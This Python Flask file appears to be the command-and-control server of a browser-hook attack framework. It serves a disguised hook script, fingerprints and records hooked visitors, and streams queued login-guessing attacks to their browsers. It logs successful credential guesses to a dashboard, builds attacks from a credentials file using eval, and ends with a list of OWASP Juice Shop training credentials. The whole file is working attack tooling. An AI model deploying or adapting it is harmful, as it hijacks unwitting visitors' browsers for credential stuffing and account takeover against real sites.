from flask import Flask, request, jsonify, render_template, Response, after_this_request, send_file, abort
from flask_cors import cross_origin
from cef import app, db, rs
from cef.models import Node, Attack, Result
from cef.utils import fingerprint
from time import sleep
import json
import pickle

def build_attack(attack_id, u, p):
    attack = Attack.query.get(attack_id)
    a = {
        'id': attack_id,
        'method': attack.method,
        'url': attack.url,
        'payload': eval(attack.payload_exp),
        'content_type': attack.content_type,
    }
    return a

def rebuild_attack(attack_id, payload):
    a = build_attack(attack_id, 'u', 'p')
    a['payload'] = payload
    return a

def attack_stream():
    while True:
        sleep(1)
        attack = rs.brpop('attacks')
        payload = 'retry: {}\n'.format(3000)
        payload += 'data: {}\n\n'.format(attack[1])
        yield payload

def results_stream():
    while True:
        result = rs.brpop('results')
        payload = 'retry: {}\n'.format(3000)
        payload +='data: {}\n\n'.format(result[1])
        yield payload

# streaming controllers

@app.route('/stream/attack')
@cross_origin()
def stream_attack():
    fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
    if not Node.get_by_fingerprint(fp):
        node = Node(
            fingerprint=fp,
            ip_address=request.remote_addr,
            target=request.referrer,
            user_agent=request.user_agent.string,
        )
        db.session.add(node)
        db.session.commit()
    return Response(attack_stream(), mimetype='text/event-stream')

@app.route('/stream/results')
def stream_results():
    return Response(results_stream(), mimetype='text/event-stream')

# attack controllers

# go ahead. call the js file whatever you want.
@app.route('/<string:filename>.js')
def js_file(filename):
    @after_this_request
    def add_header(response):
        response.headers['Content-Type'] = 'application/javascript'
        return response
    return render_template('hook.js')

@app.route('/report/result', methods=['POST'])
@cross_origin()
def report_result():
    jsonobj = json.loads(request.data)
    attack = Attack.query.get(jsonobj.get('id') or -1)
    resp = jsonobj.get('result')
    payload = jsonobj.get('payload')
    # process a valid request
    if all((attack, resp, payload)):
        # process a successful guess
        if attack.success in resp:
            # store the results
            fp = fingerprint(request.remote_addr, request.referrer, request.user_agent.string)
            node = Node.get_by_fingerprint(fp)
            result = Result(
                attack_id=attack.id,
                node_id=node.id,
                payload=payload
            )
            db.session.add(result)
            db.session.commit()
            # update dashboard
            rs.lpush('results', json.dumps(result.serialize()))
        # process an unsuccessful guess
        elif attack.fail in resp:
            # ignore the result
            pass
        # process an unexpected result
        else:
            # re-queue the payload
            a = rebuild_attack(attack.id, payload)
            rs.lpush('attacks', json.dumps(a))
    # process a bad request
    else:
        # can't re-queue the payload without a valid attack id
        abort(400)
    return 'received'

# c2 controllers

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/queue')
def queue():
    attack_id = 1
    with open(app.config['CREDS_PATH']) as fp:
        for line in fp:
            u, p = line.strip().split(':')
            a = build_attack(attack_id, u, p)
            rs.lpush('attacks', json.dumps(a))
    return 'done'

@app.route('/results')
def results():
    results = [r.serialize() for r in Result.query.all()]
    return jsonify(results=results)

'''
admin@juice-sh.op:admin123
jim@juice-sh.op:ncc-1701
bender@juice-sh.op:OhG0dPlease1nsertLiquor!
bjoern.kimminich@googlemail.com:YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==
ciso@juice-sh.op:mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb
support@juice-sh.op:J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P
morty@juice-sh.op:focusOnScienceMorty!focusOnScience
mc.safesearch@juice-sh.op:Mr. N00dles
'''